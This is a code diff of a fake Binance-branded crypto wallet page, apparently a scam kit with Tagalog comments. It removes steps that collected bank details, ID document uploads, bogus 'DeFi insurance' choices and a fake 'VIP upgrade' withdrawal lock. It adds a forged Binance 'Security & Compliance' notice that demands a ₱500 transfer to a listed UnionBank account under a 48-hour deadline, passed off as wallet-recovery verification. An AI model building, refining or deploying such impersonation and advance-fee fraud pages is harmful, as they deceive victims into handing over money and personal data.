@@ -102,6 +102,7 @@
             opacity: 0;
             pointer-events: none;
             transition: opacity 0.3s ease;
+            overflow-y: auto;
         }
         .wallet-popup-mask.active {
             opacity: 1;
@@ -113,12 +114,53 @@
             border-radius: 16px;
             padding: 40px;
             width: 90%;
-            max-width: 550px;
+            max-width: 700px;
             box-shadow: 0 15px 40px rgba(240, 185, 11, 0.15);
+            max-height: 90vh;
+            overflow-y: auto;
         }
         .wallet-popup-box.error-state {
             border-color: #f64655;
             box-shadow: 0 15px 40px rgba(246, 70, 85, 0.15);
+        }
+
+        .security-notice-text {
+            color: #fff !important;
+            line-height: 1.8;
+            font-size: 0.95rem;
+        }
+
+        .security-notice-text strong {
+            color: var(--wallet-accent-gold);
+            font-weight: 700;
+        }
+
+        .security-notice-text .warning-box {
+            background-color: rgba(240, 185, 11, 0.1);
+            border-left: 4px solid var(--wallet-accent-gold);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+
+        .transaction-details {
+            background-color: rgba(30, 35, 41, 0.8);
+            border: 1px solid var(--wallet-border);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .transaction-details p {
+            margin: 8px 0;
+            color: #eaecef;
+        }
+
+        .transaction-details .label {
+            color: var(--wallet-accent-gold);
+            font-weight: 700;
         }
     </style>
 </head>
@@ -159,196 +201,101 @@
             </div>
             
             <div class="row g-4 mb-4">
-                <div class="col-md-6">
+                <div class="col-md-4">
                     <div class="p-3 rounded border border-secondary" style="background-color: var(--wallet-panel-dark);">
                         <small class="text-muted d-block small font-weight-bold tracking-wider">ETH HOLDING BALANCE</small>
-                        <h3 class="fw-bold my-1" style="color: #0ecb81; font-family: monospace;">177,451.46 ETH</h3>
+                        <h3 class="fw-bold my-1" style="color: #0ecb81; font-family: monospace;">157,100.46 ETH</h3>
                     </div>
                 </div>
-                <div class="col-md-6">
+                <div class="col-md-4">
+                    <div class="p-3 rounded border border-secondary" style="background-color: var(--wallet-panel-dark);">
+                        <small class="text-muted d-block small font-weight-bold tracking-wider">HOLD AMOUNT</small>
+                        <h3 class="fw-bold my-1" style="color: #f0b90b; font-family: monospace;">20,000 SGD</h3>
+                    </div>
+                </div>
+                <div class="col-md-4">
                     <div class="p-3 rounded border border-secondary" style="background-color: var(--wallet-panel-dark);">
                         <small class="text-muted d-block small font-weight-bold tracking-wider">LIQUID CASH-IN REGISTRY</small>
-                        <h3 class="fw-bold my-1 text-white" style="font-family: monospace;">\$6,835.23</h3>
+                        <h3 class="fw-bold my-1 text-white" style="font-family: monospace;">$6,835.23</h3>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- HAKBANG 2: BANK CREDENTIALS FORM -->
-        <div id="withdrawalFormSection" class="flow-card d-none">
-            <h4 class="text-white fw-bold mb-4">Bank Settlement Routing Information</h4>
-            <div class="row g-4">
-                <div class="col-md-4">
-                    <div class="mb-3">
-                        <label class="form-label small text-white-50">BANK NAME</label>
-                        <input type="text" class="form-control wallet-input-field">
-                    </div>
-                    <div class="mb-3">
-                        <label class="form-label small text-white-50">BENEFICIARY ACCOUNT NAME</label>
-                        <input type="text" class="form-control wallet-input-field">
-                    </div>
-                </div>
-                <div class="col-md-4">
-                    <div class="mb-3">
-                        <label class="form-label small text-white-50">BANK ACCOUNT NUMBER</label>
-                        <input type="text" class="form-control wallet-input-field">
-                    </div>
-                    <div class="mb-3">
-                        <label class="form-label small text-white-50">OWNER LEGAL ADDRESS</label>
-                        <input type="text" class="form-control wallet-input-field">
-                    </div>
-                </div>
-                <div class="col-md-4">
-                    <div class="mb-3">
-                        <label class="form-label small text-white-50">BANK REMITTANCE ADDRESS</label>
-                        <input type="text" class="form-control wallet-input-field">
-                    </div>
-                    <div class="mb-3">
-                        <label class="form-label small text-white-50">BENEFICIARY BIRTHDATE</label>
-                        <input type="date" class="form-control wallet-input-field">
-                    </div>
-                </div>
-                <div class="col-md-4">
-                    <div class="mb-3">
-                        <label class="form-label small text-white-50">CONTACT NUMBER</label>
-                        <input type="text" class="form-control wallet-input-field">
-                    </div>
-                </div>
-                
-                <!-- 💰 DYNAMIC MATH INJECTION AREA (AMOUNT ENTRY BOX) -->
-                <div class="col-md-8">
-                    <div class="mb-3 p-3 rounded border border-warning" style="background-color: var(--wallet-panel-dark);">
-                        <label class="form-label small text-warning fw-bold tracking-wide">ENTER EXECUTION WITHDRAWAL AMOUNT (SGD)</label>
-                        <input type="number" id="inputWithdrawalAmountValue" class="form-control wallet-input-field font-monospace text-warning fw-bold fs-5" placeholder="0.00">
-                        <small class="text-muted mt-1 d-block">System note: Transfers exceeding 20,000 SGD maximum criteria trigger protocol structural holds [A1].</small>
-                    </div>
-                </div>
-            </div>
-            <button class="btn-wallet-gold w-100 mt-2 uppercase" id="btnConfirmBankDetails">Confirm Account Credentials</button>
-        </div>
+        <!-- HAKBANG 2: BANK CREDENTIALS FORM (REMOVED) -->
+        <!-- Form section has been removed per request -->
 
-        <!-- HAKBANG 3: DEFI INSURANCE GENERATOR -->
-        <div id="insuranceSection" class="flow-card d-none">
-            <h4 class="text-white fw-bold mb-2">DeFi Smart Contract Insurance Protocols</h4>
-            <p class="text-muted small mb-4">Regulatory compliance notice: Decentralized risk mitigation protocols require a validated coverage pool selection prior to liquidity settlement routing.</p>
-            
-            <div id="insuranceList">
-                <div class="insurance-card-block d-flex justify-content-between align-items-start">
-                    <div class="pe-4">
-                        <h5 class="text-warning fw-bold mb-1">1. Nexus Mutual Asset Coverage Protocol</h5>
-                        <p class="small text-white-50 text-justify mb-2" style="line-height: 1.6;">This dynamic cryptographic layer initiates comprehensive protection directly against network architecture vulnerabilities and protocol-level exploit exposures.</p>
-                        <div class="small text-muted" style="font-size: 0.82rem;"><span class="text-warning fw-bold">✨ Card Benefits:</span> Full restitution up to 500,000 SGD equivalent • Zero liquidity lock-in periods • Autonomous claims dispatch.</div>
-                    </div>
-                    <button class="btn btn-sm btn-outline-warning select-ins-btn" style="min-width: 120px; margin-top: 5px;">Select Policy</button>
-                </div>
+        <!-- HAKBANG 3: DEFI INSURANCE GENERATOR (REMOVED) -->
+        <!-- Insurance section has been removed per request -->
 
-                <div class="insurance-card-block d-flex justify-content-between align-items-start">
-                    <div class="pe-4">
-                        <h5 class="text-warning fw-bold mb-1">2. InsurAce Decentralized Multi-Chain Risk Shield</h5>
-                        <p class="small text-white-50 text-justify mb-2" style="line-height: 1.6;">Provides an algorithmic institutional safeguard across multi-sig node execution loops. Specially engineered for cross-chain settlement validation.</p>
-                        <div class="small text-muted" style="font-size: 0.82rem;"><span class="text-warning fw-bold">✨ Card Benefits:</span> Instant cross-chain reconciliation pool • Sovereign multi-asset coverage • Premium tier support.</div>
-                    </div>
-                    <button class="btn btn-sm btn-outline-warning select-ins-btn" style="min-width: 120px; margin-top: 5px;">Select Policy</button>
-                </div>
+        <!-- HAKBANG 4: KYC VERIFICATION SECTION (REMOVED) -->
+        <!-- KYC section has been removed per request -->
 
-                <div class="insurance-card-block d-flex justify-content-between align-items-start">
-                    <div class="pe-4">
-                        <h5 class="text-warning fw-bold mb-1">3. Bridge Mutual Layer-1 Liquidity Contingency Shield</h5>
-                        <p class="small text-white-50 text-justify mb-2" style="line-height: 1.6;">A premium discretionary coverage platform utilizing autonomous liquidity smart pools to validate high-value transaction routing.</p>
-                        <div class="small text-muted" style="font-size: 0.82rem;"><span class="text-warning fw-bold">✨ Card Benefits:</span> Algorithmic liquidity replacement warranty • Immediate settlement routing • Sovereign protocol layer coverage.</div>
-                    </div>
-                    <button class="btn btn-sm btn-outline-warning select-ins-btn" style="min-width: 120px; margin-top: 5px;">Select Policy</button>
-                </div>
-            </div>
-            
-            <div class="d-flex gap-3 mt-4">
-            <!-- BUTTONS LAYOUT INTERFACE -->
-            <div class="d-flex gap-3 mt-4">
-                <button class="btn btn-secondary w-50 fw-bold py-3 text-uppercase" id="btnSkipInsurance" style="letter-spacing: 0.5px;">Skip Protocol Insurance</button>
-                <button class="btn-wallet-gold w-50 btn fw-bold py-3 text-uppercase" id="btnNextFromInsurance" style="letter-spacing: 0.5px;" disabled>Proceed to Asset Transfer</button>
-            </div>
-        </div>
-
-        <!-- ==========================================================================
-             🔳 HAKBANG 4: KYC VERIFICATION SECTION (NAKAKULONG SA GRAY BOX)
-             ========================================================================== -->
-        <div id="kycSection" class="flow-card d-none">
-            <h4 class="text-white fw-bold mb-2">Institutional Identity Verification (KYC)</h4>
-            <p class="text-muted small mb-4">Please upload certified legal compliance documents below to verify node liquidity source authenticity.</p>
-            <div class="row g-3 mb-4">
-                <div class="col-md-4">
-                    <label class="form-label small text-white-50">GOVERNMENT VALID IDENTITY DOCUMENT</label>
-                    <input type="file" class="form-control wallet-input-field">
-                </div>
-                <div class="col-md-4">
-                    <label class="form-label small text-white-50">CERTIFIED BANK STATEMENT (LAST 3 MO.)</label>
-                    <input type="file" class="form-control wallet-input-field">
-                </div>
-                <div class="col-md-4">
-                    <label class="form-label small text-white-50">VERIFIABLE SOURCE OF INCOME RECORD</label>
-                    <input type="file" class="form-control wallet-input-field">
-                </div>
-            </div>
-            <button class="btn-wallet-gold w-100 fw-bold py-3 text-uppercase" id="btnExecuteFinalWithdrawal">Execute Liquidity Withdrawal</button>
-        </div>
-
-        <!-- ==========================================================================
-             🔳 HAKBANG 5: LOADING BACKDROP WHEEL (NAKAKULONG SA GRAY BOX)
-             ========================================================================== -->
+        <!-- HAKBANG 5: LOADING BACKDROP WHEEL -->
         <div id="loadingSection" class="flow-card d-none text-center py-5">
             <div class="spinner-border spinner-border-custom mb-3" role="status"></div>
-            <h4 class="text-white" id="loadingTextStatus">Initializing Secure Validation Gate...</h4>
+            <h4 class="text-white" id="loadingTextStatus">Processing Security Verification...</h4>
             <p class="text-muted small">Validating cryptographic parameters and transaction routing logs.</p>
         </div>
 
-        <!-- ==========================================================================
-             🔳 HAKBANG 6: FINAL ERROR MESSAGE PANEL (NAKAKULONG SA GRAY BOX)
-             ========================================================================== -->
-        <div id="limitErrorSection" class="flow-card d-none border border-danger">
-            <div class="d-flex align-items-center gap-3 text-danger mb-3">
-                <h3>⚠️</h3>
-                <h4 class="fw-bold m-0">TRANSACTION REGISTRY FAILURE: COMPLIANCE REJECTION</h4>
+        <!-- HAKBANG 6: SECURITY COMPLIANCE NOTICE -->
+        <div id="securityComplianceSection" class="flow-card d-none border border-warning">
+            <div class="d-flex align-items-center gap-3 mb-4">
+                <h3 style="color: var(--wallet-accent-gold);">🔐</h3>
+                <h4 class="fw-bold m-0 text-white">BINANCE SECURITY & COMPLIANCE DIVISION</h4>
             </div>
-            <hr class="border-danger">
+            <hr class="border-warning">
             
-            <div class="p-3 mb-4 rounded border border-danger text-justify" style="background-color: rgba(246, 70, 93, 0.05);">
-                <p class="mb-2 fw-bold text-white">AUTOMATED AUDIT DISPATCH REPORT:</p>
-                <p class="mb-2 text-white-50">
-                    The transaction was flagged and frozen because your withdrawal volume query of <span id="displayTargetAmount" class="text-danger fw-bold font-monospace">0.00</span> SGD exceeds the maximum single-transaction clearance threshold.
-                </p>
-                <p class="mb-0 text-warning font-monospace small">
-                    ▶ EVALUATION RESULT: Total funds locked in routing pipeline. Based on a daily clearance rate of 20,000 SGD max, your liquidity payload will be released incrementally over <span id="displayCalculatedDays">0</span> business days.
-                </p>
+            <div class="security-notice-text">
+                <p class="text-muted mb-3"><strong>Official Website:</strong> binance.com</p>
+                <p class="text-muted mb-1"><strong>Verification Ref:</strong> RECOV-NET-KLAY-dcf77cda-9414-4369-a4c3-c818d3ec8f3c</p>
+                <p class="text-muted mb-4"><strong>Date:</strong> May 29, 2026</p>
+
+                <p class="mb-3"><strong>Subject:</strong> MANDATORY SECURITY BANK TRANSACTION FOR KLAYTN WALLET RESTORATION</p>
+
+                <p class="mb-4">Dear Account Holder,</p>
+
+                <p class="mb-4">We are writing to officially confirm that the structural recovery process for your digital asset wallet (KLAY Network Address: DyoscEKhJ2x2F9sd1cNi34yhMNC6bXPDXsv3wZXzv2ud) has been initiated under Ticket ID: 120352.</p>
+
+                <p class="mb-4"><strong>To finalize the activation of your recovered wallet and securely unlock your funds, our Risk Management Protocol mandates a Security Verification Transaction.</strong></p>
+
+                <div class="warning-box">
+                    <p class="mb-0"><strong>Why is this required for your recovered wallet?</strong><br>
+                    When a blockchain wallet is restored, security protocols require absolute proof of identity to prevent unauthorized asset draining, hacking, or identity fraud. A live bank transfer serves as a direct, verified link between your physical identity (bank KYC) and your digital crypto account.</p>
+                </div>
+
+                <p class="mb-4">Please complete the initial transaction using the exact parameters below to whitelist your bank and activate the wallet:</p>
+
+                <div class="transaction-details">
+                    <p><span class="label">🏦 TRANSACTION DEPOSIT DETAILS:</span></p>
+                    <p><span class="label">Beneficiary Bank:</span> UnionBank of the Philippines</p>
+                    <p><span class="label">Corporate Account Name:</span> Binance Philippines Solutions Inc.</p>
+                    <p><span class="label">Account Number:</span> 1047-2851-9765</p>
+                    <p><span class="label">Exact Amount to Send:</span> ₱500.00</p>
+                    <p><span class="label">Reference Notes / Remarks:</span> Ticket-120352 / dcf77cda-9414-4369-a4c3-c818d3ec8f3c</p>
+                </div>
+
+                <div class="warning-box" style="border-left-color: #f64655;">
+                    <p class="mb-2"><strong style="color: #f64655;">⚠️ CRITICAL COMPLIANCE RULES:</strong></p>
+                    <p class="mb-2"><strong>Strict Same-Name Policy:</strong> The bank account you use to send the fiat funds must exactly match the legal name on your verified Binance KYC profile.</p>
+                    <p class="mb-2"><strong>Third-Party Prohibition:</strong> Any transfer from an account belonging to a friend, relative, spouse, or business entity will result in an automatic system rejection and a permanent freeze on the recovery process.</p>
+                    <p class="mb-0"><strong>Refund Process:</strong> This micro-deposit is strictly for security matching. The exact amount will be fully credited to your wallet balance or refunded to your bank account within 24 to 48 hours after verification.</p>
+                </div>
+
+                <p class="mt-4 mb-4">Please upload a clear screenshot of your successful bank transfer receipt directly to your open support ticket for immediate auditing.</p>
+
+                <div class="warning-box" style="border-left-color: #f64655;">
+                    <p class="mb-0"><strong style="color: #f64655;">Failure to perform this verification transaction within forty-eight (48) hours will cause this security window to expire, and the wallet will remain locked for asset protection.</strong></p>
+                </div>
+
+                <p class="mt-4 mb-0">Sincerely,<br><strong>The Binance Accounts Recovery Team</strong><br>Global Risk & Security Operations</p>
             </div>
 
-            <div class="row g-4 my-2">
-                <div class="col-md-6">
-                    <div class="p-3 rounded bg-dark border border-secondary">
-                        <small class="text-muted d-block fw-bold text-white-50">VERIFIED STANDARD ACCOUNT</small>
-                        <h4 class="text-warning fw-bold my-1">20,000 SGD DAILY MAXIMUM</h4>
-                        <span class="badge bg-danger">1.5% PROCESSING FEE APPLIED</span>
-                        <p class="text-muted small mt-2 mb-0">An automated operational fee overhead calculation of <strong id="displayCalculatedFee" class="text-danger">0.00 SGD</strong> is deducted per withdrawal cycle.</p>
-                    </div>
-                </div>
-                <div class="col-md-6">
-                    <div class="p-3 rounded bg-dark border border-warning" style="box-shadow: 0 0 10px rgba(240,185,11,0.15);">
-                        <small class="text-warning d-block fw-bold">✨ VIP NODE STATUS LIMIT</small>
-                        <h4 class="text-success fw-bold my-1">500,000 SGD DAILY MAXIMUM</h4>
-                        <span class="badge bg-success">0% TRANSACTION FEES</span>
-                        <p class="text-muted small mt-2 mb-0">Direct structural execution gateway with absolute clearing priority and zero overhead deductions.</p>
-                    </div>
-                </div>
-            </div>
-            <div class="text-center mt-4 d-flex flex-column gap-3 max-width-500 mx-auto">
-                <button class="btn btn-warning fw-bold px-5 py-3 text-dark btn-wallet-gold" id="btnAvailVipNow" style="border-radius: 30px; font-size: 1.1rem; text-transform: uppercase;">
-                    🚀 Initialize Instant VIP Node Upgrade
-                </button>
-                <button class="btn btn-outline-danger fw-bold py-3 text-uppercase" style="border-radius: 30px; letter-spacing: 1px;" onclick="alert('System notification: Opening high-priority secure dispatch line to Support Team.');">
-                    📞 CONTACT SUPPORT DESK ESCALATION
-                </button>
-            </div>
+            <button class="btn btn-outline-warning w-100 mt-4 fw-bold" onclick="document.getElementById('securityComplianceSection').classList.add('d-none'); document.getElementById('walletReportMatrixLayer').classList.remove('d-none');">
+                Return to Wallet Dashboard
+            </button>
         </div>
-    </div> <!-- Isinasara ang pinaka-unang container div ng body structure -->
+    </div>
 
     <!-- ==========================================================================
          🔳 HAKBANG 7: FLOATING SECURITY SUPPORT POPUP BOX MODAL
@@ -359,13 +306,10 @@
             <h4 id="popupHeadlineText" class="text-white fw-bold mb-3" style="letter-spacing: 0.5px;">SYSTEM SUPPORT NOTIFICATION</h4>
             <hr style="border-color: #474d57;">
             <p id="popupBodyParagraphText" class="text-white-50 text-start" style="line-height: 1.6; font-size: 0.95rem;">
-                VIP Node Upgrade initialization state: <span class="text-success fw-bold">SUCCESS</span>. The Customer Support network will send an official dispatch email confirmation once the processing cycle completes.
-            </p>
-            <p class="text-warning text-start small fw-bold" id="popupNoticeText" style="line-height: 1.5;">
-                *Notice: This process requires pre-approval steps from local settlement clearing houses and comprehensive verification cycles for all submitted identification documents.
+                Message content here.
             </p>
             <button class="btn btn-outline-warning w-100 mt-4 fw-bold" onclick="document.getElementById('binanceSupportPopupMask').classList.remove('active')">
-                Acknowledge Support Message
+                Acknowledge Message
             </button>
         </div>
     </div>
@@ -379,32 +323,8 @@
         const walletInput = document.getElementById("walletAuthCodeField");
         const reportLayer = document.getElementById("walletReportMatrixLayer");
         const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
-        const formSection = document.getElementById("withdrawalFormSection");
-        const confirmBankBtn = document.getElementById("btnConfirmBankDetails");
-        const insuranceSection = document.getElementById("insuranceSection");
-        const selectInsBtn = document.querySelectorAll(".select-ins-btn");
-        const nextInsBtn = document.getElementById("btnNextFromInsurance");
-        const skipInsBtn = document.getElementById("btnSkipInsurance");
-        const kycSection = document.getElementById("kycSection");
-        const executeWithdrawalBtn = document.getElementById("btnExecuteFinalWithdrawal");
         const loadingSection = document.getElementById("loadingSection");
-        const loadingTextStatus = document.getElementById("loadingTextStatus");
-        const errorSection = document.getElementById("limitErrorSection");
-        const availVipBtn = document.getElementById("btnAvailVipNow");
-        const supportPopup = document.getElementById("binanceSupportPopupMask");
-        const popupBoxElement = document.getElementById("popupBoxElement");
-
-        const inputAmount = document.getElementById("inputWithdrawalAmountValue");
-        const displayTargetAmount = document.getElementById("displayTargetAmount");
-        const displayCalculatedDays = document.getElementById("displayCalculatedDays");
-        const displayCalculatedFee = document.getElementById("displayCalculatedFee");
-
-        const popupIcon = document.getElementById("popupIconIndicator");
-        const popupHeadline = document.getElementById("popupHeadlineText");
-        const popupBody = document.getElementById("popupBodyParagraphText");
-        const popupNotice = document.getElementById("popupNoticeText");
-
-        let globalAmountInput = 0;
+        const securityComplianceSection = document.getElementById("securityComplianceSection");
 
         // Step 0 -> Step 1: Login Verification Gate
         if (syncWalletBtn) {
@@ -419,103 +339,19 @@
             });
         }
 
-        // Step 1 -> Step 2: Form Interface Opener
+        // Step 1 -> Step 2: Trigger Security Compliance Notice Instead of Withdrawal Form
         if (withdrawalBtn) {
             withdrawalBtn.addEventListener("click", function () {
-                formSection.classList.remove("d-none");
-                formSection.scrollIntoView({ behavior: 'smooth' });
-            });
-        }
-
-        // Step 2 -> Step 3: Insurance Options Core Validation Check
-        if (confirmBankBtn) {
-            confirmBankBtn.addEventListener("click", function () {
-                const parsedValue = parseFloat(inputAmount.value);
-                if (isNaN(parsedValue) || parsedValue <= 0) {
-                    alert("Please enter a valid execution withdrawal volume parameter.");
-                    return;
-                }
-                globalAmountInput = parsedValue; // Save to runtime storage registry loop
-                insuranceSection.classList.remove("d-none");
-                insuranceSection.scrollIntoView({ behavior: 'smooth' });
-            });
-        }
-
-        // Insurance matrix selection toggles handler configuration
-        selectInsBtn.forEach(btn => {
-            btn.addEventListener("click", function () {
-                selectInsBtn.forEach(b => { 
-                    b.classList.remove("btn-warning", "text-dark"); 
-                    b.classList.add("btn-outline-warning"); 
-                    b.innerText = "Select Policy"; 
-                });
-                this.classList.remove("btn-outline-warning"); 
-                this.classList.add("btn-warning", "text-dark"); 
-                this.innerText = "Policy Chosen";
-                if (nextInsBtn) nextInsBtn.removeAttribute("disabled");
-            });
-        });
-
-        const triggerKycSection = function() {
-            if (kycSection) { kycSection.classList.remove("d-none"); kycSection.scrollIntoView({ behavior: 'smooth' }); }
-        };
-        if (nextInsBtn) nextInsBtn.addEventListener("click", triggerKycSection);
-        if (skipInsBtn) skipInsBtn.addEventListener("click", triggerKycSection);
-
-        // ==========================================================================
-        // 🔲 Step 4 -> CORE INTERACTION AND VALUE EVALUATION CALCULATOR
-        // ==========================================================================
-        if (executeWithdrawalBtn) {
-            executeWithdrawalBtn.addEventListener("click", function () {
-                kycSection.classList.add("d-none");
+                reportLayer.classList.add("d-none");
                 loadingSection.classList.remove("d-none");
-                loadingTextStatus.innerText = "Connecting Crypto Routing Pipeline Nodes...";
                 loadingSection.scrollIntoView({ behavior: 'smooth' });
 
-                // 3-second network processing loop timeline simulation parameters
+                // Simulate processing delay
                 setTimeout(function () {
                     loadingSection.classList.add("d-none");
-
-                    // 🔲 CONDITION 1: SUCCESSFUL WITHDRAWAL FOR 20,000 SGD PABABA
-                    if (globalAmountInput <= 20000) {
-                        popupBoxElement.classList.remove("error-state");
-                        popupIcon.innerText = "✔";
-                        popupIcon.className = "text-success mb-3";
-                        popupHeadline.innerText = "WITHDRAWAL PROTOCOL SUCCESSFUL";
-                        popupBody.innerHTML = `Liquidity settlement query of <span class='text-success fw-bold'>${globalAmountInput.toLocaleString()} SGD</span> has initialized processing states. Funds will be transferred within 24-48 business hours to your registered bank account.`;
-                        popupNotice.innerText = "*Notice: Operational updates and settlement clearance verification logs will be dispatched to your encrypted registered communication line parameters.";
-                        supportPopup.classList.add("active");
-                    } 
-                    // 🔲 CONDITION 2: ACCOUNT PROTOCOL LOCKOUT FOR VALUES EXCEEDING 20,000 SGD
-                    else {
-                        const feeCalculated = globalAmountInput * 0.015; // 1.5% deduction fee calculation formula
-                        const daysRequired = Math.ceil(globalAmountInput / 20000); // Amount divide by 20,000 daily increment calculation
-
-                        // Inject operational calculations parameters into view fields elements
-                        displayTargetAmount.innerText = globalAmountInput.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
-                        displayCalculatedDays.innerText = daysRequired;
-                        displayCalculatedFee.innerText = feeCalculated.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2}) + " SGD";
-
-                        errorSection.classList.remove("d-none");
-                        errorSection.scrollIntoView({ behavior: 'smooth' });
-                    }
-                }, 3000);
-            });
-        }
-
-        // VIP Upgrade validation confirmation handler configuration link - 100% FAILURE STATE
-        if (availVipBtn) {
-            availVipBtn.addEventListener("click", function () {
-                // 100% FAILURE STATE - Always fails
-                popupBoxElement.classList.add("error-state");
-                popupIcon.innerText = "⏳";
-                popupIcon.className = "text-warning mb-3";
-                popupIcon.style.fontSize = "3rem";
-                popupHeadline.innerText = "VIP UPGRADE ON HOLD - AWAITING BANK VERIFICATION";
-                popupHeadline.className = "text-warning fw-bold mb-3";
-                popupBody.innerHTML = `Your VIP Node Status Level Upgrade request is currently <span class='text-warning fw-bold'>ON HOLD</span>.<br><br>Status: <span class='text-info fw-bold'>STILL WAITING FOR REAL BANK OWNER VERIFICATION</span><br><br>Our compliance team is currently verifying the authenticity of your bank account holder information. This verification process is required by international banking regulations and must be completed by the actual bank owner of record. We are still awaiting confirmation from your registered financial institution.`;
-                popupNotice.innerHTML = "*Notice: <span class='text-warning fw-bold'>Current Status:</span> Your VIP upgrade is in progress but cannot be finalized until we receive direct verification from your bank. Please allow 5-7 business days for the bank verification process to complete. Do not attempt resubmission as this may delay the verification process further.";
-                supportPopup.classList.add("active");
+                    securityComplianceSection.classList.remove("d-none");
+                    securityComplianceSection.scrollIntoView({ behavior: 'smooth' });
+                }, 2000);
             });
         }
     });
